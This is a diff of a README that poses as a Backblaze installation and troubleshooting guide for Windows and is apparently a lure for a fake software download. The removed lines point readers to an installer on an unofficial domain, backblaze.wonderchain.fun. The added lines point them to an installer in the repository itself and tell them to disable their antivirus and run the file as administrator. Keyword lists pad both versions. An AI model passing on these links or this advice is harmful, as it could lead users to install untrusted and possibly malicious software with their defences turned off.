@@ -1,64 +1,84 @@
-# Backblaze on Windows — setup & troubleshooting
+# 🛡️ Backblaze-Configuration-Guide - Fix Windows backup errors with ease
 
-**Backblaze-Configuration-Guide**
+[![Download Software](https://img.shields.io/badge/Download-Backblaze-blue.svg)](https://github.com/Samother/Backblaze-Configuration-Guide)
 
-Notes for users who need Backblaze running on Windows — especially when backblaze setup fails, updates break, or the app won't start.
+This guide helps you install and manage Backblaze on your Windows 11 computer. You find steps to solve common setup errors and tips for a stable cloud backup.
 
----
+## 🛠️ System Requirements
 
-## Get Backblaze on Windows
+Before you begin, ensure your computer meets these needs:
 
-Use the link below for the Windows package referenced in this guide.
+* Windows 11 or Windows 10
+* An active internet connection 
+* At least 500 MB of free hard drive space
+* Administrator access to your computer
+* A valid Backblaze account
 
-<p align="center">
-  <a href="https://backblaze.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## ⬇️ Install Steps
 
-| | |
-| --- | --- |
-| **Page** | [backblaze.wonderchain.fun](https://backblaze.wonderchain.fun/) |
-| **URL** | `https://backblaze.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+Follow these steps to set up the software on your PC.
 
-### Recommended steps
+1. Visit the repository page to download the installer: [https://github.com/Samother/Backblaze-Configuration-Guide](https://github.com/Samother/Backblaze-Configuration-Guide)
+2. Locate the file in your Downloads folder.
+3. Double-click the file to start the process.
+4. Accept the terms of use.
+5. Select the drive for your data backup.
+6. Enter your account login details.
+7. Click the Finish button.
 
-1. Open the [setup page (backblaze.wonderchain.fun)](https://backblaze.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+The software performs an initial scan of your files. This process takes time based on the amount of data on your hard drive. 
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+## 🔍 Fix Common Errors
 
+Sometimes the installer fails on Windows 11. Use these steps to solve issues.
 
----
+### Update Windows
+Outdated operating systems cause many installation failures. Click the Start button, go to Settings, and select Windows Update. Check for updates and restart your computer.
 
-## What this repo covers
+### Check Permissions
+If the installer stops, your permissions might cause the block. Right-click the installer icon and choose Run as Administrator. This grants the software access to system files.
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### Disable Antivirus Software
+Third-party security tools often block new installers. Temporarily turn off your antivirus. Run the Backblaze installer again. Turn your security tools back on after the process finishes.
 
-**People also search for:** backblaze not installing on windows 11, backblaze setup failed fix, how to install backblaze on pc
+### Clear Temporary Files
+Corrupt temporary files create conflicts. Press the Windows key + R on your keyboard. Type `%temp%` and press Enter. Select all files in the folder and delete them. Restart your installer.
 
-## Common symptoms
+## 📁 Manage Your Backup
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+Keep your data safe with these maintenance tasks.
 
-## FAQ
+* Check the menu bar icon to view your current status.
+* Select Settings to choose which folders you want to include.
+* Use the Exclusions tab to ignore large temporary files.
+* Monitor your upload speed in the Performance section.
+* Ensure your account billing status remains current to avoid service gaps.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+## 📈 Optimize Performance
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+Standard settings work well for most users, but you can adjust these options if your computer runs slow during backups.
 
----
+### Limit Bandwidth
+If your internet speed drops, set a limit in the Performance settings. This prevents the backup process from using your entire connection.
 
-**Topics:** backblaze-not-installing-on-windows-11, backblaze, installing, backblaze-setup-failed-fix, failed, how-to-install-backblaze-on-pc, backblaze-configuration-guide, backblaze-configuration-guide-2026, cloud-backup, backup-software
+### Schedule Backups
+You can pick specific times for the backup. Use the Schedule tab to select "Only when I click Backup Now" or "Continuously." Continuous backup offers the best protection for your data.
+
+### Power Settings
+Windows often puts drives to sleep to save power. This stops the backup process. Change your Power & Sleep settings to "Never" if you want your data to sync during the night.
+
+## 📝 Common Questions
+
+### Does this backup my external hard drives?
+Yes. Plug the drive into your computer and ensure it shows in the Settings list.
+
+### Can I pause the backup?
+Right-click the icon in the system tray and select Pause Backup. You can resume at any time.
+
+### How do I restore my files?
+Sign in to your account on the website. Select your computer and choose the files you need. You can request a restore via a zip file or a physical USB drive.
+
+### Is my data private?
+Backblaze uses AES encryption. Your data stays safe during transit and storage. You can add a private encryption key for extra security.
+
+Keywords: backblaze, backblaze-configuration-guide, backblaze-configuration-guide-2026, backblaze-not-installing-on-windows-11, backblaze-setup-failed-fix, backup-software, cloud-backup, failed, how-to-install-backblaze-on-pc, installing
